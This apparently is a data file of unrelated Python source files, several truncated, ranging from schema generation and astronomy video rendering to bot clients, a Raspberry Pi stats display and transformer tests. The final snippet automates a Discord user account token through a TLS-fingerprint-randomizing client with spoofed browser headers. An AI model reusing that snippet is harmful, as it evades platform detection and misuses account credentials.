    "# This file is essentially doing DFS in the protobuf Descriptors and storing in the SCHEMA. We start with as the root\n# SemanticModel at the bottom of this file. This will automatically pickup any changes to the protobuf (given you run\n# the protoc command before to regenerate the python files. Different proto messages can have the same message type as a\n# child, so we keep a dict of precomputed types to avoid double computing. This currently does not support cycles in the\n# proto definition, but we can add a visited set to this if we ever need to.\n\n\nfrom typing import Dict\n\nfrom google.protobuf.descriptor import Descriptor, EnumDescriptor, FieldDescriptor\nfrom strictyaml import Bool, Decimal, Enum, Int, Map, Optional, Seq, Str, Validator\n\nfrom semantic_model_generator.protos import semantic_model_pb2\n\nscalar_type_map = {\n    FieldDescriptor.TYPE_BOOL: Bool,\n    FieldDescriptor.TYPE_STRING: Str,\n    FieldDescriptor.TYPE_DOUBLE: Decimal,\n    FieldDescriptor.TYPE_FLOAT: Decimal,\n    FieldDescriptor.TYPE_INT32: Int,\n    FieldDescriptor.TYPE_INT64: Int,\n}\n\n\ndef create_schema_for_message(\n    message: Descriptor, precomputed_types: Dict[str, Validator]\n) -> Validator:\n    if message.name in precomputed_types:\n        return precomputed_types[message.name]\n    message_schema = {}\n    for k, v in message.fields_by_name.items():\n        if is_optional_field(v):\n            message_schema[Optional(k)] = create_schema_for_field(v, precomputed_types)\n        else:\n            message_schema[k] = create_schema_for_field(v, precomputed_types)\n    schema = Map(message_schema)\n    precomputed_types[message.name] = schema\n    return schema\n\n\ndef create_schema_for_field(\n    field_descriptor: FieldDescriptor, precomputed_types: Dict[str, Validator]\n) -> Validator:\n    if field_descriptor.type == FieldDescriptor.TYPE_MESSAGE:\n        field_type = create_schema_for_message(\n            field_descriptor.message_type, precomputed_types\n        )\n    elif field_descriptor.type == FieldDescriptor.TYPE_ENUM:\n        field_type = create_schema_for_enum(\n            field_descriptor.enum_type, precomputed_types\n        )\n    elif field_descriptor.type in scalar_type_map:\n        field_type = scalar_type_map[field_descriptor.type]()\n    else:\n        raise Exception(f\"unsupported type: {field_descriptor.type}\")\n\n    if field_descriptor.label == FieldDescriptor.LABEL_REPEATED:\n        field_type = Seq(field_type)\n\n    return field_type\n\n\ndef is_optional_field(field_descriptor: FieldDescriptor) -> bool:\n    optional_option = list(\n        filter(\n            lambda o: o[0].name == \"optional\",\n            field_descriptor.GetOptions().ListFields(),\n        )\n    )\n    # ListFields returns a list of (FieldDescriptor, value) tuples. This checks that the `optional` option is present\n    #  and that its value is True\n    return len(optional_option) > 0 and optional_option[0][1]\n\n\ndef create_schema_for_enum(\n    enum: EnumDescriptor, precomputed_types: Dict[str, Validator]\n) -> Validator:\n    if enum.name in precomputed_types:\n        return precomputed_types[enum.name]\n    schema = Enum([v.name for v in enum.values])\n    precomputed_types[enum.name] = schema\n    return schema\n\n\nSCHEMA = create_schema_for_message(semantic_model_pb2.SemanticModel.DESCRIPTOR, {})\n",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "import json\nimport sys\nimport os\nimport inspect\nimport csv\nimport nest_asyncio\nimport logging\nimport phoenix as px\nfrom enum import Enum\nfrom typing import Any, Dict, Tuple\nfrom pathlib import Path\nfrom llama_index.core import SimpleDirectoryReader, Settings, VectorStoreIndex, StorageContext, load_index_from_storage\nfrom llama_index.core.node_parser import CodeSplitter\nfrom llama_index.llms.openai import OpenAI\nfrom llama_index.llms.openai.utils import ALL_AVAILABLE_MODELS\nfrom llama_index.embeddings.openai import OpenAIEmbedding, OpenAIEmbeddingModelType\nfrom .utils import get_all_nodes_packs, json2markdown\nfrom .query_engine import NodeQueryEngine\nfrom . import MAIN_CACHE, NAME\nfrom loguru import logger\n\n\n# for phoenix logging\nimport llama_index.core\n\nuse_phoenix = os.getenv(\"ENABLE_PHOENIX_LOGGING\", \"false\").lower() == \"true\"\n\n# set this env var to true if you want llm traces to be collected and displayed in phoenix\nif use_phoenix:\n    # llama-index applications will run as usual, llm calls logs will be available at http://127.0.0.1:6006/\n    llama_index.core.set_global_handler(\"arize_phoenix\")\n\nnest_asyncio.apply()\n\n# disable annoying logs from openai requests\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\n\n\ndef init_phoenix() -> None:\n    \"\"\"Configures phoenix session if phoenix logging is enabled.\"\"\"\n    if not use_phoenix:\n        return\n    if type(sys.stdout).__name__ == \"ComfyUIManagerLogger\":\n        sys.stdout = sys.__stdout__\n        sys.stderr = sys.__stderr__\n        config = {\n            \"handlers\": [\n                {\"sink\": sys.stdout, \"format\": \"{time} - {message}\"},\n                {\"sink\": sys.stderr, \"format\": \"{time} - {message}\"},\n            ],\n        }\n        logger.configure(**config)\n    sess = px.active_session()\n    # clear before next run, instead of at the end, to allow debugging of outputs\n    if sess is not None:\n        sess.end()\n    px.launch_app()\n\n\ndef log_phoenix() -> None:\n    \"\"\"Logs number of tokens for the current phoenix session.\"\"\"\n    if use_phoenix:\n        return\n    from phoenix.trace.dsl import SpanQuery\n\n    query = SpanQuery().select(tokens_in=\"llm.token_count.prompt\", tokens_out=\"llm.token_count.completion\")\n    # The Phoenix Client can take this query and return the dataframe\n    info_df = px.Client().query_spans(query)\n    if info_df is not None:\n        logger.info(f\"Total tokens in: {info_df.tokens_in.sum()}. Total tokens out: {info_df.tokens_out.sum()}\")\n\n\nclass RegenerateOptions(Enum):\n    no = \"no\"\n    doc = \"doc\"\n    index_doc = \"index & doc\"\n    failed = \"failed\"\n\n\nclass LoadOpenAIModel:\n    \"\"\"Loads model and embed model. Note that this class is not responsoble for actually setting these models,\n    it only creates models objects and passes those to other classes.\"\"\"\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"model\": (sorted(ALL_AVAILABLE_MODELS.keys()), {\"default\": \"gpt-4-turbo-preview\"}),\n                \"temperature\": (\"FLOAT\", {\"default\": 0.0, \"min\": 0.0, \"max\": 1.0}),\n                \"embed_model\": (\n                    sorted([x.value for x in OpenAIEmbeddingModelType]),\n                    {\"default\": \"text-embedding-3-small\"},\n                ),\n            }\n        }\n\n    RETURN_TYPES = (\"LLM_MODEL\",)\n    RETURN_NAMES = (\"Model\",)\n    FUNCTION = \"load_openai_model\"\n    CATEGORY = NAME\n\n    def load_openai_model(self, model: str, temperature: int, embed_model: str) -> Dict[str, Any]:\n        if \"OPENAI_API_KEY\" not in os.environ or os.environ[\"OPENAI_API_KEY\"] == \"\":\n            raise EnvironmentError(\n                \"\"\"The environment variable OPENAI_API_KEY is not set.\nPlease set it before proceeding (refer to the ENV_VARIABLE_GUIDE.md for details).\"\"\"\n            )\n        llm = OpenAI(model=model, temperature=temperature)\n        embed_model = OpenAIEmbedding(model=embed_model)\n        return ({\"llm\": llm, \"embed_model\": embed_model},)\n\n\ncomfy_nodes_index: VectorStoreIndex | None = None\n\n\nclass DocumentPack:\n    \"\"\"Wraps documentation functionality for any pack of nodes currently available in the system.\"\"\"\n\n    @classmethod\n    def get_all_names(cls):\n        cls.all_packs = get_all_nodes_packs()\n        return [f\"{pack_name}/{len(pack['nodes'])} nodes\" for pack_name, pack in cls.all_packs.items()]\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"name\": [\n                    sorted(cls.get_all_names()),\n                ],\n                \"chunk_lines\": (\"INT\", {\"default\": 40}),\n                \"chunk_lines_overlap\": (\"INT\", {\"default\": 15}),\n                \"max_chars\": (\"INT\", {\"default\": 1500}),\n                \"num_retries\": (\"INT\", {\"default\": 5}),\n                \"top_k\": (\"INT\", {\"default\": 10}),\n                \"regenerate\": ([e.value for e in RegenerateOptions], {\"default\": RegenerateOptions.no.value}),\n                \"save_markdown\": (\"BOOLEAN\", {\"default\": True}),\n                \"model\": (\"LLM_M",
    "import asyncio\nimport logging\nfrom info import *\nfrom pyrogram import Client\nfrom util.config_parser import TokenParser\nfrom . import multi_clients, work_loads, LazyPrincessBot\n\n\nasync def initialize_clients():\n    multi_clients[0] = LazyPrincessBot\n    work_loads[0] = 0\n    all_tokens = TokenParser().parse_from_env()\n    if not all_tokens:\n        print(\"No additional clients found, using default client\")\n        return\n    \n    async def start_client(client_id, token):\n        try:\n            print(f\"Starting - Client {client_id}\")\n            if client_id == len(all_tokens):\n                await asyncio.sleep(2)\n                print(\"This will take some time, please wait...\")\n            client = await Client(\n                name=str(client_id),\n                api_id=API_ID,\n                api_hash=API_HASH,\n                bot_token=token,\n                sleep_threshold=SLEEP_THRESHOLD,\n                no_updates=True,\n                in_memory=True\n            ).start()\n            work_loads[client_id] = 0\n            return client_id, client\n        except Exception:\n            logging.error(f\"Failed starting Client - {client_id} Error:\", exc_info=True)\n    \n    clients = await asyncio.gather(*[start_client(i, token) for i, token in all_tokens.items()])\n    multi_clients.update(dict(clients))\n    if len(multi_clients) != 1:\n        MULTI_CLIENT = True\n        print(\"Multi-Client Mode Enabled\")\n    else:\n        print(\"No additional clients were initialized, using default client\")\n",
    "from __future__ import annotations\n\nimport asyncio\nfrom datetime import datetime, timedelta\nfrom typing import Set, Literal\n\nfrom lagrange.client.wtlogin.enum import QrCodeResult\nfrom launart import Launart, Service, any_completed\nfrom loguru import logger\n\nfrom satori.server import Server\nfrom lagrange import version\nfrom lagrange.client.client import Client\nfrom lagrange.info.app import app_list\nfrom lagrange.utils.sign import sign_provider\n\nfrom .info import InfoManager\nfrom .log import patch_logging\nfrom .provider import ServerProvider\nfrom .events import apply_event_handler\nfrom .apis import apply_api_handlers\nfrom .utils import QRCode\n\n\nclass NekoBoxService(Service):\n    @property\n    def required(self) -> Set[str]:\n        return set()\n\n    id = \"lagrange.satori.service\"\n\n    def __init__(\n        self,\n        server: Server,\n        uin: int,\n        access_token: str,\n        sign_url: str | None = None,\n        protocol: Literal[\"linux\", \"macos\", \"windows\"] = \"linux\",\n        log_level: str = \"INFO\",\n    ):\n        self.server = server\n        self.uin = uin\n        self.sign_url = sign_url\n        self.access_token = access_token\n        self.protocol = protocol\n        self.log_level = log_level.upper()\n        super().__init__()\n\n    @property\n    def stages(self) -> Set[Literal[\"preparing\", \"blocking\", \"cleanup\"]]:\n        return {\"preparing\", \"blocking\", \"cleanup\"}\n\n    async def qrlogin(self, client, save_to=\"./qrcode.png\") -> bool:\n        logger.info(\"Login required\")\n        fetch_rsp = await client.fetch_qrcode()\n        if isinstance(fetch_rsp, int):\n            raise AssertionError(f\"Failed to fetch QR code: {fetch_rsp}\")\n        else:\n            png, link = fetch_rsp\n        logger.debug(link[:-34])\n        if QRCode:\n            qr = QRCode()\n            qr.add_data(link[:-34])\n            qr.print_tty()\n            logger.info(\"Use Tencent QQ to scan QR code\")\n        else:\n            logger.warning(\"module 'qrcode' not available, save qrcode image to disk\")\n            with open(save_to, \"wb\") as f:\n                f.write(png)\n            logger.warning(f\"save qrcode to {save_to}\")\n        logger.info(\"waiting for your operation...\")\n\n        try:\n            return await client.qrcode_login(3)\n        except AssertionError as e:\n            logger.error(f\"qrlogin error: {e.args[0]}\")\n            return False\n\n    async def launch(self, manager: Launart):\n        queue = asyncio.Queue()\n\n        logger.info(f\"Running on '{version.__version__}' for {self.uin}\")\n\n        app = app_list[self.protocol]\n        with InfoManager(self.uin, \"bots\") as im:\n            client = Client(\n                self.uin,\n                app,\n                im.device,\n                im.sig_info,\n                sign_provider(self.sign_url) if self.sign_url else None,\n            )\n\n            self.server.apply(ServerProvider(client, queue, self.access_token))\n            apply_event_handler(client, queue)\n            apply_api_handlers(self.server, client)\n            async with self.stage(\"preparing\"):\n                client.connect()\n                success = True\n                if (datetime.fromtimestamp(im.sig_info.last_update) + timedelta(14)) > datetime.now():\n                    logger.info(\"try to fast login\")\n                    if not await client.register():\n                        logger.error(\"fast login failed, try to re-login...\")\n                        success = await client.easy_login()\n                elif im.sig_info.last_update:\n                    logger.warning(\"Refresh siginfo\")\n                    success = await client.easy_login()\n                else:\n                    success = False\n\n            patch_logging(self.log_level)\n            if not success:\n                if not await self.qrlogin(client):\n                    logger.error(\"login error\")\n                else:\n                    success = True\n\n            async with self.stage(\"blocking\"):\n                if success:\n                    im.save_all()\n                    await any_completed(\n                        manager.status.wait_for_sigexit(),\n                        client.wait_closed()\n                    )\n\n            async with self.stage(\"cleanup\"):\n                logger.warning(\"stopping client...\")\n                await client.stop()\n",
    "# -*- coding: utf-8 -*-\n#\n# Author: @billz\n# Author URI: https://github.com/billz\n# Description: RaspAP stats display for the Adafruit Mini PiTFT,\n#   a 135x240 Color TFT add-on for the Raspberry Pi.\n#   Based on Adafruit's rgb_display_ministats.py\n# See: https://github.com/adafruit/Adafruit_CircuitPython_RGB_Display\n# License: MIT License\n\nimport time\nimport subprocess\nimport digitalio\nimport board\nfrom PIL import Image, ImageDraw, ImageFont\nimport adafruit_rgb_display.st7789 as st7789\n\n# Configuration for CS and DC pins\ncs_pin = digitalio.DigitalInOut(board.CE0)\ndc_pin = digitalio.DigitalInOut(board.D25)\nreset_pin = None\n\n# Config for display baudrate (default max is 24mhz)\nBAUDRATE = 64000000\n\n# Setup SPI bus using hardware SPI\nspi = board.SPI()\n\n# Create the ST7789 display\ndisp = st7789.ST7789(spi, cs=cs_pin, dc=dc_pin, rst=reset_pin, baudrate=BAUDRATE,\n                     width=240, height=240, x_offset=0, y_offset=80)\n\n# Create blank image with mode 'RGB'\nheight = disp.width   # swap height/width to rotate it to landscape\nwidth = disp.height\nimage = Image.new('RGB', (width, height))\nrotation = 90\n\n# Get a drawing object and clear the image\ndraw = ImageDraw.Draw(image)\ndraw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))\ndisp.image(image,rotation)\n\n# Define some constants\npadding = -2\ntop = padding\nbottom = height-padding\n# Move left to right keeping track of the current x position\nx = 0\ny = 80\n\n# Load DejaVu TTF Font\n# Install with: sudo apt-get install ttf-dejavu\nfont = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 24)\n\n# Turn on the backlight\nbacklight = digitalio.DigitalInOut(board.D22)\nbacklight.switch_to_output()\nbacklight.value = True\n\nwhile True:\n    # Draw a black filled box to clear the image\n    draw.rectangle((0, 0, width, height), outline=0, fill=0)\n\n    # Collect basic system stats\n    cmd = \"hostname -I | cut -d\\' \\' -f1\"\n    IP = \"IP: \"+subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"pidof hostapd | wc -l | awk '{printf \\\"Hotspot: %s\\\", $1 == 1 ? \\\"Active\\\" : \\\"Down\\\"}'\"\n    Hostapd = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"vnstat -i wlan0 | grep tx: | awk '{printf \\\"Data Tx: %d %s\\\", $5,$6}'\"\n    DataTx = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"top -bn1 | grep load | awk '{printf \\\"CPU Load: %.2f\\\", $(NF-2)}'\"\n    CPU = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"free -m | awk 'NR==2{printf \\\"Mem: %sMB %.2f%%\\\", $3,$3*100/$2 }'\"\n    MemUsage = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = 'df -h | awk \\'$NF==\"/\"{printf \"Disk: %d/%d GB  %s\", $3,$2,$5}\\''\n    Disk = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    cmd = \"cat /sys/class/thermal/thermal_zone0/temp |  awk \\'{printf \\\"CPU Temp: %.1f C\\\", $(NF-0) / 1000}\\'\" # pylint: disable=line-too-long\n    Temp = subprocess.check_output(cmd, shell=True).decode(\"utf-8\")\n\n    # Write five lines of stats\n    y = top\n    draw.text((x, y), IP, font=font, fill=\"#ffffff\")\n    y += font.getsize(IP)[1]\n    draw.text((x, y), Hostapd, font=font, fill=\"#d46a6a\")\n    y += font.getsize(Hostapd)[1]\n    draw.text((x, y), DataTx, font=font, fill=\"#ffffff\")\n    y += font.getsize(DataTx)[1]\n    draw.text((x, y), MemUsage, font=font, fill=\"#d46a6a\")\n    y += font.getsize(MemUsage)[1]\n    draw.text((x, y), Disk, font=font, fill=\"#ffffff\")\n    y += font.getsize(Disk)[1]\n    draw.text((x, y), Temp, font=font, fill=\"#d46a6a\")\n\n    # Display image\n    disp.image(image, rotation)\n    time.sleep(.1)\n",
    "#!/usr/bin/env python3\nimport numpy\nimport torch\nimport torch.nn.functional as F\n\nfrom .adapters import (\n    run_gelu,\n    run_multihead_self_attention,\n    run_positionwise_feedforward,\n    run_rmsnorm,\n    run_scaled_dot_product_attention,\n    run_transformer_block,\n    run_transformer_lm,\n)\nfrom .common import FIXTURES_PATH\n\n\ndef test_positionwise_feedforward():\n    reference_weights = torch.load(\n        FIXTURES_PATH / \"positionwise_feedforward_weights.pt\"\n    )\n    in_features = torch.load(FIXTURES_PATH / \"in_features.pt\")\n    expected_output = torch.load(\n        FIXTURES_PATH / \"positionwise_feedforward_expected_output.pt\"\n    )\n    d_model = 64\n    d_ff = 128\n\n    actual_output = run_positionwise_feedforward(\n        d_model=d_model, d_ff=d_ff, weights=reference_weights, in_features=in_features\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_scaled_dot_product_attention():\n    torch.manual_seed(42)\n    # Take the first batch item, so we test the 3D case\n    # (input shape (batch_size, seq_len, d_k)) for scaled dot-product attention.\n    K = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_K.pt\")[0]\n    Q = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_Q.pt\")[0]\n    V = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_V.pt\")[0]\n    mask = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_mask.pt\")\n    pdrop = 0.0\n    expected_output = torch.load(\n        FIXTURES_PATH / \"scaled_dot_product_attention_expected_output.pt\"\n    )[0]\n    actual_output = run_scaled_dot_product_attention(\n        K=K, Q=Q, V=V, mask=mask, pdrop=pdrop\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_4d_scaled_dot_product_attention():\n    torch.manual_seed(42)\n    # Shape: (batch_size, num_heads, seq_len, d_k)\n    K = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_K.pt\")\n    Q = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_Q.pt\")\n    V = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_V.pt\")\n    mask = torch.load(FIXTURES_PATH / \"scaled_dot_product_attention_mask.pt\")\n    pdrop = 0.0\n    expected_output = torch.load(\n        FIXTURES_PATH / \"scaled_dot_product_attention_expected_output.pt\"\n    )\n    actual_output = run_scaled_dot_product_attention(\n        K=K, Q=Q, V=V, mask=mask, pdrop=pdrop\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_multihead_self_attention():\n    reference_weights = torch.load(\n        FIXTURES_PATH / \"unbatched_multihead_self_attention_weights.pt\"\n    )\n    in_features = torch.load(FIXTURES_PATH / \"in_features.pt\")\n    expected_output = torch.load(\n        FIXTURES_PATH / \"unbatched_multihead_self_attention_expected_output.pt\"\n    )\n    d_model = 64\n    num_heads = 2\n    attn_pdrop = 0.0\n    actual_output = run_multihead_self_attention(\n        d_model=d_model,\n        num_heads=num_heads,\n        attn_pdrop=attn_pdrop,\n        weights=reference_weights,\n        in_features=in_features,\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-6\n    )\n\n\ndef test_transformer_lm():\n    torch.manual_seed(42)\n    vocab_size = 100\n    context_length = 64\n    d_model = 128\n    num_layers = 2\n    num_heads = 2\n    d_ff = d_model * 4\n    attn_pdrop = 0.0\n    residual_pdrop = 0.0\n\n    reference_weights = torch.load(FIXTURES_PATH / \"transformer_lm_weights.pt\")\n    in_indices = torch.load(FIXTURES_PATH / \"in_indices.pt\")\n    expected_output = torch.load(FIXTURES_PATH / \"transformer_lm_expected_output.pt\")\n    actual_output = run_transformer_lm(\n        vocab_size=vocab_size,\n        context_length=context_length,\n        d_model=d_model,\n        num_layers=num_layers,\n        num_heads=num_heads,\n        d_ff=d_ff,\n        attn_pdrop=attn_pdrop,\n        residual_pdrop=residual_pdrop,\n        weights=reference_weights,\n        in_indices=in_indices,\n    )\n    numpy.testing.assert_allclose(\n        actual_output.detach().numpy(), expected_output.detach().numpy(), atol=1e-4\n    )\n\n\ndef test_transformer_lm_truncated_input():\n    torch.manual_seed(42)\n    vocab_size = 100\n    context_length = 64\n    d_model = 128\n    num_layers = 2\n    num_heads = 2\n    d_ff = d_model * 4\n    attn_pdrop = 0.0\n    residual_pdrop = 0.0\n\n    reference_weights = torch.load(FIXTURES_PATH / \"transformer_lm_weights.pt\")\n    in_indices_truncated = torch.load(FIXTURES_PATH / \"in_indices_truncated.pt\")\n    truncated_expected_output = torch.load(\n        FIXTURES_PATH / \"transformer_lm_truncated_expected_output.pt\"\n    )\n    truncated_actual_output = run_transformer_lm(\n        vocab_size=vocab_size,\n        context_length=context_length,\n        d_model=d_model,\n        num_layers=num_layers,\n        num_heads=num_heads,\n        d_ff=d_f",
    "import requests\nimport os\nimport json\nfrom .base_reader import DependencyReaderBase\nfrom dependency_release_tracker.models.dependency import Dependency\nfrom dependency_release_tracker.config import GITHUB_TOKEN\nfrom rich.console import Console\n\n\nclass SwiftDependencyReader(DependencyReaderBase):\n    def __init__(self, project_path):\n        super().__init__(project_path)\n        self.console = Console()\n        # Check if the GitHub token is available\n        if not GITHUB_TOKEN:\n            self.console.print(\n                \"Warning: GITHUB_TOKEN is not set. It is required for accessing private repositories or to increase API rate limits.\",\n                style=\"bold orange\",\n            )\n\n    def read_dependencies(self):\n        resolved_path = self.find_package_resolved()\n        if not resolved_path:\n            self.console.print(\n                \"Package.resolved file not found in any .xcworkspace directory. Please ensure you are executing the command from the root of your project.\",\n                style=\"bold red\",\n            )\n            return []\n        return self.read_package_resolved(resolved_path)\n\n    def find_package_resolved(self):\n        for root, dirs, files in os.walk(self.project_path):\n            for dir_name in dirs:\n                if dir_name.endswith(\".xcworkspace\"):\n                    path = os.path.join(\n                        root, dir_name, \"xcshareddata\", \"swiftpm\", \"Package.resolved\"\n                    )\n                    if os.path.exists(path):\n                        return path\n        return None\n\n    def read_package_resolved(self, file_path):\n        with open(file_path, \"r\") as file:\n            data = json.load(file)\n        dependencies = []\n        for package in data[\"pins\"]:\n            package_name = package[\"identity\"]\n            repo_url = package[\"location\"]\n            current_version = package[\"state\"].get(\"version\", \"\")\n            dependencies.append(\n                Dependency(\n                    name=package_name,\n                    current_version=current_version,\n                    repo_url=repo_url,\n                )\n            )\n        return dependencies\n\n    def check_updates(self, dependencies, all_versions=False):\n        self.start_progress(total=len(dependencies))\n        headers = {\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"Bearer {GITHUB_TOKEN}\",\n        }\n        updated_dependencies = []\n\n        for dependency in dependencies:\n            try:\n                repo_url = dependency.repo_url.rstrip(\".git\")\n                path_parts = repo_url.split(\"/\")\n                owner_repo = \"/\".join(path_parts[-2:])\n                api_url = f\"https://api.github.com/repos/{owner_repo}/releases/latest\"\n\n                response = requests.get(api_url, headers=headers)\n                response.raise_for_status()\n                release_data = response.json()\n\n                latest_version = release_data.get(\"tag_name\", \"\").lstrip(\"v\")\n                if all_versions or latest_version != dependency.current_version:\n                    dependency.latest_version = latest_version\n                    dependency.notes = release_data.get(\n                        \"body\", \"No release notes found.\"\n                    )\n                    dependency.url = f\"https://github.com/{owner_repo}/releases\"\n                    dependency.published_at = release_data.get(\"published_at\")\n                    updated_dependencies.append(dependency)\n\n            except requests.RequestException as e:\n                dependency.notes = f\"Error checking updates: {e}\"\n\n            finally:\n                self.update_progress()\n\n        self.complete_progress()\n\n        return updated_dependencies\n",
    "import tls_client\nimport time\nimport datetime\nimport os, random\n\nred = '\\x1b[31m(-)\\x1b[0m'\nblue = '\\x1b[34m(+)\\x1b[0m'\ngreen = '\\x1b[32m(+)\\x1b[0m'\nyellow = '\\x1b[33m(!)\\x1b[0m'\n\ndef get_timestamp():\n    time_idk = datetime.datetime.now().strftime('%H:%M:%S')\n    timestamp = f'[\\x1b[90m{time_idk}\\x1b[0m]'\n    return timestamp\n\nclass DiscordSession:\n    def __init__(self, client_identifier=\"chrome112\"):\n        self.session = tls_client.Session(client_identifier=client_identifier, random_tls_extension_order=True)\n\n    def post(self, url, headers):\n        return self.session.post(url, headers=headers)\n\nclass LootBoxOpener:\n    lootbox_items = {\n        \"1214340999644446726\": \"Quack!!\",\n        \"1214340999644446724\": \"\u2b95\u2b06\u2b07\u2b95\u2b06\u2b07\",\n        \"1214340999644446722\": \"Wump Shell\",\n        \"1214340999644446720\": \"Buster Blade\",\n        \"1214340999644446725\": \"Power Helmet\",\n        \"1214340999644446723\": \"Speed Boost\",\n        \"1214340999644446721\": \"Cute Plushie\",\n        \"1214340999644446728\": \"Dream Hammer\",\n        \"1214340999644446727\": \"OHHHHH BANANA\"\n    }\n\n    def __init__(self, discord_session, token):\n        self.discord_session = discord_session\n        self.token = token\n        self.headers = {\n            'authority': 'discord.com',\n            'accept': '*/*',\n            'accept-language': 'en-US',\n            'authorization': token,\n            'origin': 'https://discord.com',\n            'referer': 'https://discord.com/channels/1222747973205758002/1224417703100551169',\n            'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-origin',\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9037 